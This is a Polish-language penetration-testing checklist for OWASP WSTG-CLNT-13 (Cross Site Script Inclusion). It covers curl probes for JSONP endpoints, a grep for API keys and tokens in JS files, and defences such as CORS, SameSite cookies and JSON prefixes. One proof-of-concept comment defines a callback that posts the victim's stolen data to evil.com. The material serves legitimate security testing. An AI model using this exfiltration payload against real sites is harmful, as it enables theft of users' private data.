# WSTG-CLNT-13 — Testing for Cross Site Script Inclusion (XSSI)

## Cele

- Locate sensitive data across the system
- Assess the leakage of sensitive data through various techniques

## KOMENDY

### Identyfikacja JSONP endpointow

```bash
curl -s "https://TARGET/api/data?callback=test" | head -50
curl -s "https://TARGET/api/user?jsonp=test" | head -50

```

### Test XSSI - wlaczenie skryptu z innej domeny

```bash
# PoC:
# <script src="https://TARGET/api/data?callback=steal"></script>
# <script>function steal(data){fetch('http://evil.com/?d='+JSON.stringify(data))}</script>

```

### Sprawdzenie dynamicznych JS z danymi

```bash
curl -s "https://TARGET/js/config.js" | grep -i "api_key\|token\|secret\|password"

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings JSONP

```bash
# Desktop/WSTG/PayloadsAllTheThings-master/XSS Injection/Intruders/jsonp_endpoint.txt

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Szukaj JSONP endpointow (callback=, jsonp=, cb=)
2. Sprawdz czy JSONP odpowiedzi zawieraja wrazliwe dane
3. Sprawdz dynamiczne pliki JS pod katem wrazliwych danych
4. Stworz PoC HTML importujacy skrypt z TARGET
5. Sprawdz Content-Type odpowiedzi (powinien byc application/json, nie text/javascript)


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md

### Cross-Site Script Inclusion (XSSI) — czym jest

- Atakujacy importuje skrypt/JSONP z TARGET na swojej stronie: `<script src="TARGET/api/data?callback=steal">`
- Przegladarka automatycznie dolacza cookies ofiary → dane wraca do strony atakujacego
- Roznica od XSS: atakujacy NIE wstrzykuje kodu do TARGET — importuje dane Z TARGET

### JSONP — ryzyka

- JSONP wraca dane jako `callback({...})` — przegladarka wykonuje jako JavaScript
- Atakujacy definiuje `callback` na swojej stronie — odczytuje dane ofiary
- **Obrona**: nie uzywaj JSONP — migruj na CORS z `Access-Control-Allow-Origin`

### Obrona przed XSSI

- **Nie zwracaj wrazliwych danych** w JSONP/dynamic JS — uzywaj JSON + CORS
- **Waliduj Referer/Origin** header — odrzuc requesty z nieznanych domen
- **CSRF token** w parametrze — JSONP request bez tokenu = odrzucony
- **Content-Type**: `application/json` (nie `text/javascript`) — zapobiega importowaniu przez `<script>`
- **SameSite cookies**: `Lax` lub `Strict` — cookie nie bedzie dolaczane w cross-site `<script>` request
- **JSON prefix**: dodaj `)]}'` lub `while(1);` przed JSON — zapobiega direct execution

### Testowanie

- Szukaj JSONP endpointow: `callback=`, `jsonp=`, `cb=` parametry
- Stworz PoC: `<script>function callback(data){alert(JSON.stringify(data))}</script><script src="TARGET/api?callback=callback"></script>`
- Sprawdz czy odpowiedz zawiera wrazliwe dane (PII, tokeny, dane uzytkownika)

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| CSRF Scanner | Automatyczne skanowanie podatnosci CSRF | [GitHub](https://github.com/ah8r/csrf) |
| EasyCSRF | Wykrywanie slabej ochrony CSRF | [GitHub](https://github.com/0ang3el/EasyCSRF) |
